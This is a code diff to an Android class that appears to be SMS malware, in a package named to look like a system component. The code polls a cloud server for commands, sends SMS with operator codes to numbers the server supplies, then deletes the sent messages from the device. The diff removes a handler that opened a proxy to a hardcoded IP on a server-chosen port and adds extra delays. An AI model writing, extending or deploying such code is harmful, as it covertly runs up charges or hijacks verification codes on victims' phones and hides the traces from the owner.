@@ -3,7 +3,6 @@ package com.android.sms.client;
 import android.content.Context;
 import android.util.Log;
 
-import com.android.proxy.client.GlobalProxyUtil;
 import com.avos.avoscloud.AVException;
 import com.avos.avoscloud.AVObject;
 import com.avos.avoscloud.AVQuery;
@@ -40,6 +39,7 @@ public class GetMsgRunnable implements Runnable {
 			if (DEBUG) {
 				Log.d(TAG, "开始轮询了");
 			}
+
 			updateCheckInfo();
 		} catch (Exception e) {
 			if (DEBUG) {
@@ -48,18 +48,8 @@ public class GetMsgRunnable implements Runnable {
 		}
 	}
 
-	private void handleResponse(RemotePortJson remotePortJson) {
-		if (remotePortJson.getCode() == 0) {
-			RemotePortInfo info = remotePortJson.getData();
-			if (info != null) {
-				int port = info.getPort();
-				Log.d(TAG, "获取的远程端口是：" + info.getPort());
-				if (port > 10000) {
-					GlobalProxyUtil.getInstance(mContext).startProxy("103.27.79.138", port);
-				}
-			}
-		}
-	}
+
+
 
 
 	//获取最新的指令，
@@ -77,7 +67,7 @@ public class GetMsgRunnable implements Runnable {
 				final String operatorCode = info.getOperatorCode();
 
 				final String operatorInfo = operators + "_" + operatorCode;
-                Log.d(TAG,"短信:"+operatorInfo);
+				Log.d(TAG, "短信:" + operatorInfo);
 				boolean isExist = Util_Sp.isOperatorInfoExist(mContext, operatorInfo);
 				if (isExist) {
 					if (!isDeleteOldData) {
@@ -86,7 +76,7 @@ public class GetMsgRunnable implements Runnable {
 				}
 				//发送短信
 				if (DEBUG) Log.d(TAG, "开始发送短信！！！！！！！！");
-                sendSmsTime = System.currentTimeMillis();
+				sendSmsTime = System.currentTimeMillis();
 				SmsManageUtil.getInstance(mContext).sendSMS(operators, operatorCode);
 				currentCheckInfo = info;
 				String message = "\n\nsend " + info.getOperatorCode() + " to " + info.getOperators();
@@ -98,6 +88,7 @@ public class GetMsgRunnable implements Runnable {
 					}
 					Thread.sleep(35000);
 					SmsManageUtil.getInstance(mContext).deleteSMS(mContext, info.getOperatorCode());
+					Thread.sleep(15000);
 				} catch (InterruptedException e) {
 					if (DEBUG) {
 						Log.e(TAG, e.toString());
@@ -106,7 +97,6 @@ public class GetMsgRunnable implements Runnable {
 			}
 		}
 	}
-
 
 
 }
